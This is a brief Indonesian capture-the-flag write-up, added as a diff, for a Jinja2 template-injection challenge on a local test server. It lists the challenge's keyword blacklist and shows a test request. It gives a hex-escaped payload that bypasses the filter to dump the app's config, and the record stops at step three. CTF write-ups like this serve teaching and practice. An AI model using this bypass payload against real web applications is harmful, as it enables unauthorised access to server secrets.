@@ -1,0 +1,24 @@
+!tidak diberikan full source code, hanya filter
+
+blacklists = ['config', 'class', 'mro', 'import', 'builtins', 'popen', 'system', 'eval', 'exec', 'url_for', 'request', 'update', 'subprocess', '\..', ',', "''", '[]', '_', '*', '+', '-', '~', '>', '<',]
+
+
+penyelesaian:
+
+1. test ssti dengan (-).
+
+[Request]
+POST / HTTP/1.1
+Host: 127.0.0.1:1337
+
+{{3-3}}
+
+[Response]
+Path 0 already exists. Please enter a new path.
+
+
+2. read config {{config}} dengan => {{self|attr("\x5f\x5fdict\x5f\x5f")}}
+
+3. terdapat flag_location dan url flag_reader.
+
+
